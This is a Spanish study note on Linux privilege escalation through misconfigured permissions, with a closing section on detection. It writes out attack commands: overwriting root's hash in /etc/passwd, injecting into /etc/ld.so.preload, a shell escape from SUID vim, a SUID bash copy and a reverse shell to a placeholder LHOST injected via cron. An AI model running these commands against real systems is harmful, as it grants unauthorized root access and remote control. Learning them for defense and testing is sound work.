 
---
Tags: #permisos #password #hash #passwd #cron #shadow

---
## 📌 Definición

Ocurre cuando los permisos de archivos, directorios o configuraciones en Linux están mal implementados, permitiendo a un usuario sin privilegios **leer, modificar o ejecutar archivos críticos** del sistema.  
Esto puede derivar en la escalada de privilegios hasta **root**.

---

## 🔑 Técnicas comunes

### 1. **Manipulación de `/etc/passwd`**

Si un usuario sin privilegios puede **escribir en `/etc/passwd`**, se puede agregar/modificar contraseñas sin depender de `/etc/shadow`.

- **Generar un hash de contraseña con OpenSSL:**
    

`openssl passwd -6 password123`

- **Insertar el hash detrás del usuario (ej: root):**
    

`root:$6$8k12nsnKj...:0:0:root:/root:/bin/bash`

- **Acceder como root:**
    

`su root`

✅ Si `/etc/passwd` es modificable → bypass de `/etc/shadow`.

---

### 2. **Archivos root editables en `$HOME`**

Algunos servicios mal configurados (ej: backups, scripts de cron) pueden guardar archivos como `root` dentro del **directorio personal del usuario** pero con permisos de escritura.

- **Ejemplo:**
    

`-rw-r--rw- 1 root user 1234 Jul  7 11:11 /home/user/.bashrc`

📌 Si puedes modificar `.bashrc`, `.profile`, `.ssh/authorized_keys`, etc. que sean propiedad de root → ejecutarás comandos como root en el próximo login de root.

---

### 3. **Archivos de configuración sensibles editables**

- **Ejemplos peligrosos:**
    
    - `/etc/sudoers`
        
    - `/etc/ld.so.conf`
        
    - `/etc/ld.so.preload`
        
    - `/etc/crontab`
        

Si alguno es editable por un usuario normal → escalada directa a root.

- **Ejemplo con `/etc/ld.so.preload`:**
    

`echo "/tmp/mylib.so" > /etc/ld.so.preload`

Cuando root ejecute cualquier binario, cargará tu librería maliciosa.

---

### 4. **SUID mal configurados**

Si un binario con SUID (`chmod +s`) está mal configurado, puede explotarse para ejecutar comandos con privilegios.

- **Buscar SUID en el sistema:**
    

```bash
find / -perm -4000 2>/dev/null
```

- **Ejemplo vulnerable (vim con SUID root):**
    

`vim -c ':!sh'`

---

### 5. **Mala configuración en Cron Jobs**

Si existen tareas programadas de root que ejecutan scripts en directorios editables por usuarios → inyección de comandos.

- **Ejemplo:**
    

`* * * * * root /home/user/backup.sh`

📌 Si `backup.sh` es editable → se puede inyectar `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`.

---

### 6. **Permisos incorrectos en binarios críticos**

Archivos como `/bin/bash`, `/bin/su`, `/usr/bin/sudo` no deberían ser editables.  
Si lo son → reemplazo directo con un binario malicioso.

- **Ejemplo:**
    

`cp /bin/bash /tmp/bash_root chmod u+s /tmp/bash_root /tmp/bash_root -p`

---

## 📊 Tabla de referencia rápida

|**Vector**|**Explicación**|**Ejemplo de abuso**|
|---|---|---|
|`/etc/passwd` editable|Permite setear hash de contraseña sin usar `/etc/shadow`|`openssl passwd -6 pass`|
|Archivos root en `$HOME`|Root guarda archivos editables en el home del usuario|Modificar `.bashrc` para inyectar comandos|
|`/etc/ld.so.preload`|Carga librerías maliciosas con permisos root|`echo /tmp/lib.so > /etc/ld.so.preload`|
|SUID mal configurado|Binarios con privilegios root explotables|`vim -c ':!sh'`|
|Cron jobs|Scripts ejecutados por root editables por usuario|Inyectar reverse shell|
|Binarios críticos editables|Reemplazo de ejecutables clave|Modificar `/bin/su`|

---

## 🛡️ Cómo detectarlo

- Buscar permisos de escritura globales:
    

`find / -writable ! -user $(whoami) 2>/dev/null`

- Verificar archivos críticos:
    

`ls -l /etc/passwd /etc/shadow /etc/sudoers`

- Revisar cron jobs:
    

`cat /etc/crontab ls -l /etc/cron.*`

- Buscar SUID:
    

`find / -perm -4000 -type f 2>/dev/null`